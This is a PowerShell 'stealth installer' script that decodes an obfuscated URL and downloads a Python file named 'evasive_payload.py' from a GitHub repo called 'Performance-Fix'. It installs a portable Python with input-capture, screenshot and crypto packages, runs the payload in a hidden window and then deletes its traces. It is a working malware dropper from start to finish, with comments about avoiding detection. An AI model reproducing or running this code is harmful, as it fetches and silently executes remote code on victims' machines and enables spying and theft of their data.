# setup.ps1 - Stealth Installer
$ErrorActionPreference = "Continue"

# ---- Decode URLs ----
function Deobfuscate-String($s) {
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
}

$payloadUrl = Deobfuscate-String "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZvcnRuaXRlMDcxMjEwMi1kb3QvUGVyZm9ybWFuY2UtRml4L3JlZnMvaGVhZHMvbWFpbi9ldmFzaXZlX3BheWxvYWQucHk="
$pythonZipUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
$getPipUrl = "https://bootstrap.pypa.io/get-pip.py"

$tempDir = "$env:TEMP\py_setup"
New-Item -ItemType Directory -Force -Path $tempDir -ErrorAction SilentlyContinue | Out-Null

# ---- Use .NET WebClient to avoid detection ----
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

# --- Download Everything Silently ---
$webClient.DownloadFile($payloadUrl, "$env:TEMP\payload.py")
$webClient.DownloadFile($pythonZipUrl, "$tempDir\python.zip")

# --- Extract Python and Enable Pip ---
Expand-Archive -Path "$tempDir\python.zip" -DestinationPath "$env:TEMP\python_embed" -Force
$pthFile = Get-ChildItem "$env:TEMP\python_embed\*._pth" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($pthFile) {
    $content = Get-Content $pthFile.FullName -Raw
    $content = $content -replace '#import site', 'import site'
    Set-Content $pthFile.FullName $content -NoNewline
}
$pythonExe = "$env:TEMP\python_embed\python.exe"

# --- Install Pip & Packages ---
$webClient.DownloadFile($getPipUrl, "$tempDir\get-pip.py")
& $pythonExe "$tempDir\get-pip.py" --quiet --no-warn-script-location

$packages = @("cryptography","pynput","mss","pillow","psutil","requests","numpy")
foreach ($pkg in $packages) {
    & $pythonExe -m pip install $pkg --quiet --disable-pip-version-check --no-warn-script-location --user
}

# ---- Silent Execution & Cleanup ----
Start-Process -FilePath $pythonExe -ArgumentList "$env:TEMP\payload.py" -WindowStyle Hidden
Start-Sleep -Seconds 10
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\python_embed" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\payload.py" -Force -ErrorAction SilentlyContinue